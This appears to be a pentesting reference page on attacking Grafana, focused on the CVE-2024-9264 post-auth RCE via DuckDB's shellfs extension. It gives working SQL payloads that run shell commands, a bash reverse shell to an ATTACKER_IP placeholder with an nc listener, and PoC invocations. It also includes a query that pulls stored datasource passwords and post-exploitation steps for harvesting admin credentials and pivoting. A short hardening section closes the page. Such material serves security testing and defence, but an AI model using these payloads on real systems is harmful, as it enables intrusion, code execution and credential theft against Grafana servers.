# Grafana

{{#include ../../banners/hacktricks-training.md}}

## Interesting stuff

- The file **`/etc/grafana/grafana.ini`** can contain sensitive information such as **admin** **username** and **password.**
- Inside the platform you could **invite people** or **generate API keys** (might need to be admin)
- You could check which plugins are installed (or even install new)
- By default it uses **SQLite3** database in **`/var/lib/grafana/grafana.db`**
  - `select user,password,database from data_source;`

## CVE-2024-9264 – SQL Expressions (DuckDB shellfs) post-auth RCE / LFI

Grafana’s experimental SQL Expressions feature can evaluate DuckDB queries that embed user-controlled text. Insufficient sanitization allows attackers to chain DuckDB statements and load the community extension shellfs, which exposes shell commands via pipe-backed virtual files.

Impact
- Any authenticated user with VIEWER or higher can get code execution as the Grafana OS user (often grafana; sometimes root inside a container) or perform local file reads.
- Preconditions commonly met in real deployments:
  - SQL Expressions enabled: `expressions.enabled = true`
  - `duckdb` binary present in PATH on the server

Quick checks
- In the UI/API, browse Admin settings (Swagger: `/swagger-ui`, endpoint `/api/admin/settings`) to confirm:
  - `expressions.enabled` is true
  - Optional: version (e.g., v11.0.0 vulnerable), datasource types, etc.
- Shell on host: `which duckdb` must resolve for the exploit path below.

Manual query pattern using DuckDB + shellfs
- Abuse flow (2 queries):
  1) Install and load the shellfs extension, run a command, redirect combined output to a temp file via pipe
  2) Read back the temp file using `read_blob`

Example SQL Expressions payloads that get passed to DuckDB:
```sql
-- 1) Prepare shellfs and run command
SELECT 1; INSTALL shellfs FROM community; LOAD shellfs;
SELECT * FROM read_csv('CMD >/tmp/grafana_cmd_output 2>&1 |');
-- 2) Read the output back
SELECT content FROM read_blob('/tmp/grafana_cmd_output');
```
Replace CMD with your desired command. For file-read (LFI) you can instead use DuckDB file functions to read local files.

One-liner reverse shell example
```bash
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"
```
Embed that as CMD in the first query while you have a listener: `nc -lnvp 443`.

Automated PoC
- Public PoC (built on cfreal’s ten framework):
  - [https://github.com/nollium/CVE-2024-9264](https://github.com/nollium/CVE-2024-9264)

Usage example
```bash
# Confirm execution context and UID
python3 CVE-2024-9264.py -u <USER> -p <PASS> -c id http://grafana.target
# Launch a reverse shell
python3 CVE-2024-9264.py -u <USER> -p <PASS> \
  -c 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"' \
  http://grafana.target
```
If output shows `uid=0(root)`, Grafana is running as root (common inside some containers).

Post-exploitation notes
- Harvest environment secrets from the spawned process (`env` or `/proc/<pid>/environ`). Grafana commonly exposes variables like:
  - `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD`
  - These may be reused in other places (e.g., SSH, basic-auth on internal tools). See Linux post-exploitation tips below.
- Container indicators: `/.dockerenv`, short hex hostname, Docker bridge IP in `/proc/net/fib_trie`.
- Local port-only panels: Pivot with SSH local port forwarding: `ssh -L 9001:localhost:<port> user@host` and browse `http://localhost:9001` from your box.

Detection & hardening
- Disable SQL Expressions if not needed: `expressions.enabled = false` (ini or via provisioning)
- Remove or restrict DuckDB availability on the server PATH if SQL Expressions are enabled
- Restrict extension loading in DuckDB if applicable; monitor for `INSTALL shellfs` or unexpected use of `read_csv('...|')`
- Upgrade Grafana to a fixed version (see the official advisory linked below) and review all users with VIEWER+ access
- Monitor admin API usage and unusual SQL Expression panels/queries
